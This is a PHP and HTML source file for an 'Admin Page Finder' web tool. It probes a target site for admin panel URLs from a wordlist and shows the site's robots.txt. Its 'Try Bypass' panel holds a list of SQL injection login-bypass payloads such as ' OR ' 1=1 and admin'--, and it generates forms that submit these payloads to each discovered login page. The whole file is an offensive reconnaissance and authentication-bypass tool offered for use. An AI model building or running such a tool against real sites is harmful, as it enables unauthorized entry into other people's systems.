<title>Admin Page Finder Version </title>
<head>
<script>
function invisible()
{
document.getElementById("opciones").style.display="none";
document.getElementById("opciones").style.position="absolute";
}
function visible()
{
document.getElementById("opciones").style.display="block";
document.getElementById("opciones").style.position="relative";
}
function invisible_help()
{
document.getElementById("help").style.display="none";
document.getElementById("help").style.position="absolute";
}
function visible_help()
{
document.getElementById("help").style.display="block";
document.getElementById("help").style.position="relative";
}
function hidden_searching()
{
document.getElementById("searching").style.visibility="hidden";
document.getElementById("searching").style.position="relative";
}
function visible_content()
{
document.getElementById("contenido").style.display="block";
document.getElementById("contenido").style.position="relative";
}
</script>
<style>
<!--
A:link
{
    color: White;
    text-decoration: none;
    font-family: Lucida Sans
}
A:visited
{
    color: Gray;
    text-decoration: none;
    font-family: Lucida Sans
}
A:active
{
    color: Black;
    text-decoration: none;
    font-family: Lucida Sans
}
A:hover
{
    color: Black;
    text-decoration: underline;
    font-family: Lucida Sans
}
.input
{
    border: 2px solid white;
    height: 35px;
    width: 350px;
    font-size: 22px;
    -moz-border-radius-bottomleft:10px;
    -moz-border-radius-bottomright:10px;
    -moz-border-radius-topleft:10px;
    -moz-border-radius-topright:10px;
    font-weight: bold;
}
.robots
{
    border: 2px solid white;
    height: 500px;
    width: 400px;
    font-size: 22px;
    -moz-border-radius-bottomleft:15px;
    -moz-border-radius-bottomright:15px;
    -moz-border-radius-topleft:15px;
    -moz-border-radius-topright:15px;
    font-weight: bold;
}
.table
{
    border: 5px solid White;
    background-color: Black;
    -moz-border-radius-bottomleft:10px;
    -moz-border-radius-bottomright:10px;
    -moz-border-radius-topleft:10px;
    -moz-border-radius-topright:10px;
    font-weight: bold;
}
.buttonoff
{
    border: 2px solid Gray;
    height: 30px;
    width: 100px;
    font-size: 15px;
    color: DimGray;
    -moz-border-radius-bottomleft:5px;
    -moz-border-radius-bottomright:5px;
    -moz-border-radius-topleft:5px;
    -moz-border-radius-topright:5px;
    font-weight: bold;
    background-color: DarkGray;
}
.button
{
    border: 2px solid White;
    height: 30px;
    width: 100px;
    font-size: 15px;
    color: White;
    -moz-border-radius-bottomleft:5px;
    -moz-border-radius-bottomright:5px;
    -moz-border-radius-topleft:5px;
    -moz-border-radius-topright:5px;
    font-weight: bold;
    background-color: Black;
}
.title
{
    color: Black;
    font-family: Lucida Sans Unicode;
    font-size: 30px;
    font-weight: bold;
}
.texto
{
    color: Black;
    font-family: Lucida Sans;
    font-size: 15px;
    font-weight: bold;
}
.textoo
{
    color: White;
    font-family: Lucida Sans;
    font-size: 15px;
    font-weight: bold;
}
.credits
{
    color: Black;
    font-family: Lucida Sans;
    font-size: 10px;
    font-weight: bold;
}
.textoamarillo
{
    color: Black;
    font-family: Lucida Sans;
    font-size: 15px;
    font-weight: bold;
}
.textorojo
{
    color: Black;
    font-family: Lucida Sans;
    font-size: 20px;
    font-weight: bold;
}
.searching
{
    color: Black;
    font-family: Lucida Sans;
    font-size: 30px;
    font-weight: bold;
}
-->
</style>
</head>
<body bgcolor="black" onload="hidden_searching(); visible_content();">
<div aria-busy="true" aria-label="Loading" role="progressbar" class="container">
  <div class="swing">
    <div class="swing-l"></div>
    <div></div>
    <div></div>
    <div></div>
    <div></div>
    <div></div>
    <div class="swing-r"></div>
  </div>
  <div class="shadow">
    <div class="shadow-l"></div>
    <div></div>
    <div></div>
    <div></div>
    <div></div>
    <div></div>
    <div class="shadow-r"></div>
  </div>
 </div>
 <style>
 body {
  background: #ede9de;
}
.container {
  left: 50%;
  margin: auto -50px;
  position: absolute;
  top: 50%;
}
.swing div {
  border-radius: 50%;
  float: left;
  height: 1em;
  width: 1em;
}
.swing div:nth-of-type(1) {
  background: -webkit-linear-gradient(left, #385c78 0%, #325774 100%);
  background: linear-gradient(to right, #385c78 0%, #325774 100%);
}
.swing div:nth-of-type(2) {
  background: -webkit-linear-gradient(left, #325774 0%, #47536a 100%);
  background: linear-gradient(to right, #325774 0%, #47536a 100%);
}
.swing div:nth-of-type(3) {
  background: -webkit-linear-gradient(left, #4a5369 0%, #6b4d59 100%);
  background: linear-gradient(to right, #4a5369 0%, #6b4d59 100%);
}
.swing div:nth-of-type(4) {
  background: -webkit-linear-gradient(left, #744c55 0%, #954646 100%);
  background: linear-gradient(to right, #744c55 0%, #954646 100%);
}
.swing div:nth-of-type(5) {
  background: -webkit-linear-gradient(left, #9c4543 0%, #bb4034 100%);
  background: linear-gradient(to right, #9c4543 0%, #bb4034 100%);
}
.swing div:nth-of-type(6) {
  background: -webkit-linear-gradient(left, #c33f31 0%, #d83b27 100%);
  background: linear-gradient(to right, #c33f31 0%, #d83b27 100%);
}
.swing div:nth-of-type(7) {
  background: -webkit-linear-gradient(left, #da3b26 0%, #db412c 100%);
  background: linear-gradient(to right, #da3b26 0%, #db412c 100%);
}
.shadow {
  clear: left;
  padding-top: 1.5em;
}
.shadow div {
  -webkit-filter: blur(1px);
  filter: blur(1px);
  float: left;
  width: 1em;
  height: .25em;
  border-radius: 50%;
  background: #e3dbd2;
}
.shadow .shadow-l {
  background: #d5d8d6;
}
.shadow .shadow-r {
  background: #eed3ca;
}
@-webkit-keyframes ball-l {
  0%, 50% {
    -webkit-transform: rotate(0) translateX(0);
    transform: rotate(0) translateX(0);
  }
  100% {
    -webkit-transform: rotate(50deg) translateX(-2.5em);
    transform: rotate(50deg) translateX(-2.5em);
  }
}
@keyframes ball-l {
  0%, 50% {
    -webkit-transform: rotate(0) translate(0);
    transform: rotate(0) translateX(0);
  }
  100% {
    -webkit-transform: rotate(50deg) translateX(-2.5em);
    transform: rotate(50deg) translateX(-2.5em);
  }
}
@-webkit-keyframes ball-r {
  0% {
    -webkit-transform: rotate(-50deg) translateX(2.5em);
    transform: rotate(-50deg) translateX(2.5em);
  }
  50%,
  100% {
    -webkit-transform: rotate(0) translateX(0);
    transform: rotate(0) translateX(0);
  }
}
@keyframes ball-r {
  0% {
    -webkit-transform: rotate(-50deg) translateX(2.5em);
    transform: rotate(-50deg) translateX(2.5em);
  }
  50%,
  100% {
    -webkit-transform: rotate(0) translateX(0);
    transform: rotate(0) translateX(0)
  }
}
@-webkit-keyframes shadow-l-n {
  0%, 50% {
    opacity: .5;
    -webkit-transform: translateX(0);
    transform: translateX(0);
  }
  100% {
    opacity: .125;
    -webkit-transform: translateX(-1.57em);
    transform: translateX(-1.75em);
  }
}
@keyframes shadow-l-n {
  0%, 50% {
    opacity: .5;
    -webkit-transform: translateX(0);
    transform: translateX(0);
  }
  100% {
    opacity: .125;
    -webkit-transform: translateX(-1.75);
    transform: translateX(-1.75em);
  }
}
@-webkit-keyframes shadow-r-n {
  0% {
    opacity: .125;
    -webkit-transform: translateX(1.75em);
    transform: translateX(1.75em);
  }
  50%,
  100% {
    opacity: .5;
    -webkit-transform: translateX(0);
    transform: translateX(0);
  }
}
@keyframes shadow-r-n {
  0% {
    opacity: .125;
    -webkit-transform: translateX(1.75em);
    transform: translateX(1.75em);
  }
  50%,
  100% {
    opacity: .5;
    -webkit-transform: translateX(0);
    transform: translateX(0);
  }
}
.swing-l {
  -webkit-animation: ball-l .425s ease-in-out infinite alternate;
  animation: ball-l .425s ease-in-out infinite alternate;
}
.swing-r {
  -webkit-animation: ball-r .425s ease-in-out infinite alternate;
  animation: ball-r .425s ease-in-out infinite alternate;
}
.shadow-l {
  -webkit-animation: shadow-l-n .425s ease-in-out infinite alternate;
  animation: shadow-l-n .425s ease-in-out infinite alternate;
}
.shadow-r {
  -webkit-animation: shadow-r-n .425s ease-in-out infinite alternate;
  animation: shadow-r-n .425s ease-in-out infinite alternate;
}
</style>
<center>
<font class="title">Admin Page Finder</font>
<form action="" method="post" name="form">
<div id="searching">
<font class="searching">Searching...</font><br>
</div>

<div id="contenido" style="display:none;">
<font class="textorojo">Website:<br></font>
<input type="text" name="domain" class="input"><br>
<font class="textorojo"><br>Admin Link List:<br></font>
<input type="text" name="textfile" class="input" value="admin.txt"><br>
<br><input type="submit" value="Search" class="button" onclick="searching()"><br><br>
<input type="checkbox" checked="true" name="rv"><b><font class="texto">Robots Viewer</font></b><br>
<b><font class="texto"><a onclick="visible()" onmouseover="document.body.style.cursor='pointer'" onmouseout="document.body.style.cursor='default'">[+]</a></font><font class="texto">Try Bypass</font></b><br>
<div id="opciones" style="display:none;">
<table>
<th colspan=2><center><font class="textoamarillo"><br><br><br><br>Name Of Input</form></center></th>
<tr><td><font class="texto">Username</td><td><font class="texto">Pass</font></td></tr>
<tr><td><input type="radio" value="username" name="user"><font class="texto">username</font></td><td><input type="radio" value="pass" name="pass"><font class="texto">pass</font></td></tr>
<tr><td><input type="radio" value="usuario" name="user"><font class="texto">usuario</font></td><td><input type="radio" value="passwd" name="pass"><font class="texto">passwd</font></td></tr>
</table>
<table>
<th colspan=2><center><font class="textoamarillo">Name Of Login</form></center></th>
<tr><td><font class="texto">Username</td><td><font class="texto">Pass</font></td></tr>
<tr><td><input type="radio" value="admin" name="userlogin"><font class="texto">admin</font></td><td><input type="radio" value="' OR ' 1=1" name="passlogin"><font class="texto">' OR ' 1=1</font></td></tr>
<tr><td><input type="radio" value="administrador" name="userlogin"><font class="texto">administrador</font></td><td><input type="radio" value="'OR''='" name="passlogin"><font class="texto">'OR''='</font></td></tr>
<tr><td><input type="radio" value="admin'--" name="userlogin"><font class="texto">admin'--</font></td><td><input type="radio" value="') OR ('a' = 'a" name="passlogin"><font class="texto">') OR ('a' = 'a</font></td></tr>
<tr><td><input type="radio" value="user" name="userlogin"><font class="texto">admin</font></td><td><input type="radio" value="' or 0=0 --" name="passlogin"><font class="texto">' or 0=0 --</font></td></tr>
<tr><td><input type="radio" value="administrador" name="userlogin"><font class="texto">administrador</font></td><td><input type="radio" value='" or 0=0 --' name="passlogin"><font class="texto">" or 0=0 -- </font></td></tr>
<tr><td><input type="radio" value="'OR''='" name="userlogin"><font class="texto">'OR''='</font></td><td><input type="radio" value="or 0=0 --" name="passlogin"><font class="texto">or 0=0 --</font></td></tr>
<tr><td><input type="radio" value="" name="userlogin"><font class="texto"></font></td><td><input type="radio" value="' or 0=0 #" name="passlogin"><font class="texto">' or 0=0 #</font></td></tr>
<tr><td><input type="radio" value="" name="userlogin"><font class="texto"></font></td><td><input type="radio" value='" or 0=0 #' name="passlogin"><font class="texto">" or 0=0 #</font></td></tr>
<tr><td><input type="radio" value="" name="userlogin"><font class="texto"></font></td><td><input type="radio" value="or 0=0 #" name="passlogin"><font class="texto">or 0=0 #</font></td></tr>
<tr><td><input type="radio" value="" name="userlogin"><font class="texto"></font></td><td><input type="radio" value="' or 'x'='x" name="passlogin"><font class="texto">' or 'x'='x</font></td></tr>
<tr><td><input type="radio" value="" name="userlogin"><font class="texto"></font></td><td><input type="radio" value="') or ('x'='x" name="passlogin"><font class="texto">') or ('x'='x</font></td></tr>
<tr><td><input type="radio" value="" name="userlogin"><font class="texto"></font></td><td><input type="radio" value="' or 1=1--" name="passlogin"><font class="texto">' or 1=1--</font></td></tr>
<tr><td><input type="radio" value="" name="userlogin"><font class="texto"></font></td><td><input type="radio" value='" or 1=1--' name="passlogin"><font class="texto">" or 1=1--</font></td></tr>
<tr><td><input type="radio" value="" name="userlogin"><font class="texto"></font></td><td><input type="radio" value="or 1=1--" name="passlogin"><font class="texto">or 1=1--</font></td></tr>
<tr><td><input type="radio" value="" name="userlogin"><font class="texto"></font></td><td><input type="radio" value="' or a=a--" name="passlogin"><font class="texto">' or a=a--</font></td></tr>
<tr><td><input type="radio" value="" name="userlogin"><font class="texto"></font></td><td><input type="radio" value='" or "a"="a' name="passlogin"><font class="texto">" or "a"="a</font></td></tr>
<tr><td><input type="radio" value="" name="userlogin"><font class="texto"></font></td><td><input type="radio" value="') or ('a'='a " name="passlogin"><font class="texto">') or ('a'='a</font></td></tr>
<tr><td><input type="radio" value="" name="userlogin"><font class="texto"></font></td><td><input type="radio" value='") or ("a"="a' name="passlogin"><font class="texto">") or ("a"="a</font></td></tr>
<tr><td><input type="radio" value="" name="userlogin"><font class="texto"></font></td><td><input type="radio" value='hi" or "a"="a' name="passlogin"><font class="texto">hi" or "a"="a</font></td></tr>
<tr><td><input type="radio" value="" name="userlogin"><font class="texto"></font></td><td><input type="radio" value='hi" or 1=1 --' name="passlogin"><font class="texto">hi" or 1=1 --</font></td></tr>
<tr><td><input type="radio" value="" name="userlogin"><font class="texto"></font></td><td><input type="radio" value="hi' or 1=1 --" name="passlogin"><font class="texto">hi' or 1=1 --</font></td></tr>
<tr><td><input type="radio" value="" name="userlogin"><font class="texto"></font></td><td><input type="radio" value="hi' or 'a'='a" name="passlogin"><font class="texto">hi' or 'a'='a</font></td></tr>
<tr><td><input type="radio" value="" name="userlogin"><font class="texto"></font></td><td><input type="radio" value="hi') or ('a'='a" name="passlogin"><font class="texto">hi') or ('a'='a</font></td></tr>
<tr><td><input type="radio" value="" name="userlogin"><font class="texto"></font></td><td><input type="radio" value='hi")or("a"="a' name="passlogin"><font class="texto">hi")or("a"="a</font></td></tr>
<th colspan=2><center><b><font class="texto"><a onclick="invisible()" onmouseover="document.body.style.cursor='pointer'" onmouseout="document.body.style.cursor='default'">[Close]</a></font></b></center></th>
</table>
</div>
<b><font class="texto"><a onclick="visible_help()" onmouseover="document.body.style.cursor='pointer'" onmouseout="document.body.style.cursor='default'">[?]</a></font><font class="texto">Help</font></b><br>
<div id="help" style="display:none;">
<table>
<td>
<font class="texto"><br><br><br><br>Go Back to our tool , And you will find a Contact Tab<br>
</font>
</td><tr></tr>
<th colspan=2><center><b><font class="texto"><a onclick="invisible_help()" onmouseover="document.body.style.cursor='pointer'" onmouseout="document.body.style.cursor='default'">[Close]</a></font></b></center></th>
</table>
</div>
</form>
</div>

<?php
if (isset($_POST['domain']) && isset($_POST['textfile']))
{
$domain=htmlentities($_POST['domain']);
echo "
<center><br><br><font color='Black' size='4' face='Lucida Sans'>Found Panel  $domain:</font></center>
<br>
<table class='table'>
";




$textfile=$_POST['textfile'];
$pannel=@file($textfile);



$t=0;
while ($t<count($pannel))
{
if (isset($domain))
{
$http7chars=substr($domain,0,7);
$https8chars=substr($domain,0,8);

$http=eregi("http://",$http7chars);
$https=eregi("https://",$https8chars);
if ($http OR $https)
{
$website="$domain";
}
else
{
$website="http://$domain";
}
$http7charswebsitefinal=substr($website,0,7);
$https8charswebsitefinal=substr($website,0,8);
$httpwebsitefinal=eregi("http://",$http7charswebsitefinal);
$httpswebsitefinal=eregi("https://",$https8charswebsitefinal);
if ($httpwebsitefinal)
{
$websinhttp=substr($website,7);
}
if ($httpswebsitefinal)
{
$websinhttp=substr($website,8);
}
$posicionpunto=strpos($websinhttp,".");
$restoweb=substr($websinhttp,$posicionpunto+1);
$ultimocaracterpunto=$pannel[$t][strlen($pannel[$t])-3];
if ($ultimocaracterpunto==".")
{
$panel=substr($pannel[$t],0,-2);
$websitepanel="http://$panel$restoweb";
}
else
{
$primercaracterbarra=$pannel[$t][0];
if ($primercaracterbarra=="/")
{
$panel=substr($pannel[$t],0,-2);
$websitepanel="$website$panel";
}
else
{
$panel=substr($pannel[$t],0,-2);
$websitepanel="$website/$panel";
}
}
}



$find=htmlentities($websitepanel);




$webcurl = curl_init();
curl_setopt($webcurl, CURLOPT_URL, $find);
curl_setopt($webcurl, CURLOPT_RETURNTRANSFER, 1);
curl_exec($webcurl);
$code = curl_getinfo($webcurl, CURLINFO_HTTP_CODE);
curl_close($webcurl);



if($code != 404 && $code != 0)
{
if (isset($_POST['user']) && isset($_POST['pass']) && isset($_POST['userlogin']) && isset($_POST['passlogin']))
{


$uservalue=htmlentities($_POST['userlogin']);
$passvalue=htmlentities($_POST['passlogin']);
$user=htmlentities($_POST['user']);
$pass=htmlentities($_POST['pass']);
$passvalue=str_replace("\'","'",$passvalue);


echo "<tr><td><font class='textoo'>$code</font> </td><td><form action='$find' method='post'><a href='$find' onclick=".'"'."window.open('$find','_blank','width=800,height=600'); return false;".'"'.">$find</a><input type='hidden' value='$uservalue' name='$user'><input type='hidden' name='$pass' value=".'"'."$passvalue".'"'."></td><td><input class='button' type='submit' value='Try Bypass'></td></form>";
}
else
{
echo "<tr><td><font class='textoo'>$code</font> </td><td><form action='' method='post'><a href='$find' onclick=".'"'."window.open('$find','_blank','width=800,height=600'); return false;".'"'.">$find</a><input type='hidden' value='' name=''><input type='hidden' name='' value=''></td><td><input class='buttonoff' type='hidden' value='' disabled='true'></td></tr></form>";
}
}
@fclose($web);
$t++;
}
echo "</table>";
//Robots Viewer
if (isset($_POST['rv']))
{
$robots_viewer=$_POST['rv'];
if ($robots_viewer="true");
{
if (isset($domain))
{
$http=strpos($domain,"http://");
if ($http)
{
$websiterobots="$domain/robots.txt";
}
else
{
$websiterobots="http://$domain/robots.txt";
}
}
$robots=@fopen($websiterobots,"r");
if ($robots)
{
$robotscontent=@file_get_contents($websiterobots);
$robotscontent=str_replace("<","&lt;",$robotscontent);
$robotscontent=str_replace(">","&gt;",$robotscontent);
echo "
<table border=0><tr><td>
<br>
<br>
<center><b><font color='Black' size=3 face='Lucida Sans'>
File robots.txt Found.<br>
Containing:<br>
<textarea rows='20' cols='50' class='robots'>
$robotscontent
</textarea></font></b><br></center>
";
}
}
}
}
?>
<b><center><font class="credits">Coded by <a href="http://fb.com/ceh.tn">Wesleti Fedy</a></font></b></center></td></tr></table>
</center>
</body>